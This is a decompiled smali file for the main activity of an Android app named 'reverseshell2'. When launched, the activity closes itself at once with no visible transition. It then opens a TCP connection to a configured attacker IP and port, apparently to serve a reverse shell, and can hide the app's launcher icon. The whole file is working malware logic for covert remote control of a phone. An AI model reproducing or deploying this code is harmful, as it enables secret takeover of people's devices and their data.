.class public Lcom/example/reverseshell2/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "MainActivity.java"


# static fields
.field static TAG:Ljava/lang/String;


# instance fields
.field activity:Landroid/app/Activity;

.field context:Landroid/content/Context;

.field private mWakeLock:Landroid/os/PowerManager$WakeLock;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 16
    const-string v0, "MainActivityClass"

    sput-object v0, Lcom/example/reverseshell2/MainActivity;->TAG:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 12
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    .line 14
    iput-object p0, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;

    .line 17
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/example/reverseshell2/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .line 21
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 22
    const/4 v0, 0x0

    invoke-virtual {p0, v0, v0}, Lcom/example/reverseshell2/MainActivity;->overridePendingTransition(II)V

    .line 23
    invoke-virtual {p0}, Lcom/example/reverseshell2/MainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iput-object v1, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;

    .line 24
    sget-object v1, Lcom/example/reverseshell2/MainActivity;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "\t"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v3, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 29
    invoke-virtual {p0}, Lcom/example/reverseshell2/MainActivity;->finish()V

    .line 30
    new-instance v1, Lcom/example/reverseshell2/tcpConnection;

    iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;

    iget-object v3, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;

    invoke-direct {v1, v2, v3}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    sget-object v3, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;

    aput-object v3, v2, v0

    sget-object v3, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;

    const/4 v4, 0x1

    aput-object v3, v2, v4

    invoke-virtual {v1, v2}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 31
    invoke-virtual {p0, v0, v0}, Lcom/example/reverseshell2/MainActivity;->overridePendingTransition(II)V

    .line 32
    sget-boolean v0, Lcom/example/reverseshell2/config;->icon:Z

    if-eqz v0, :cond_0

    .line 33
    new-instance v0, Lcom/example/reverseshell2/functions;

    iget-object v1, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;

    invoke-direct {v0, v1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iget-object v1, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/functions;->hideAppIcon(Landroid/content/Context;)V

    .line 35
    :cond_0
    return-void
.end method
